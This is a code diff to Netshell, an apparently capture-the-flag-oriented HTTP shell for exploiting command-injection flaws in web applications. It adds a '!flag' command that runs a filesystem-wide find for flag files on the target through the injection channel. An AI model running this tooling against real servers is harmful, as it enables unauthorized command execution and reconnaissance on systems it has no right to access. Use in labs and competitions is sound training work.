@@ -98,6 +98,22 @@ def preflight_request():
     return True
 
 
+def command_flag() -> bool:
+    find_command = 'find / -type f -name "*flag*" 2>/dev/null'
+    response = send_command(find_command)
+    if not response:
+        return False
+    
+    paths = response.strip().splitlines()
+    prime_candidates = []
+    for path in paths:
+        if path.endswith("flag.txt") or path.endswith("flag.md"):
+            prime_candidates.append(path)
+    print(f"[] Prime candidates for flag files:\n{'\\n'.join(prime_candidates)}\n")
+    print(f"[] All found files:\n{response}")
+    return True
+
+
 def main():
     global address, parameter, url_encode, verbose, cookies, user_agent, prefix, suffix, no_preflight
     parser = argparse.ArgumentParser(description=f"Netshell v{VERSION} - A lightweight HTTP CLI Shell that enables custom command injections into vulnerable web applications with a familiar shell-like interface.")
@@ -149,12 +165,15 @@ def main():
                 print("Exiting shell.")
                 break
             elif command.lower() == '!help':
-                print("\nAll Netshell commands start with '!' and are used to control the shell or automate tasks. Other commands are sent to the server. Available commands:")
+                print("\nAll Netshell commands start with '!' and are used to control the shell or automate tasks. Other commands are sent to the server. All command only work on Linux systems. Available commands:")
                 print("  !exit - Exit the shell")
                 print("  !help - Show this help message")
+                print("  !flag - Search for files with 'flag' in their name and display potential candidates")
                 print("\nAuthor: Richard A. Dubniczky, https://dubniczky.com")
                 print("Source: https://github.com/dubniczky/Netshell")
-            
+            elif command.lower() == '!flag':
+                command_flag()
+
             try:
                 output = send_command(command)
             except Exception as e:
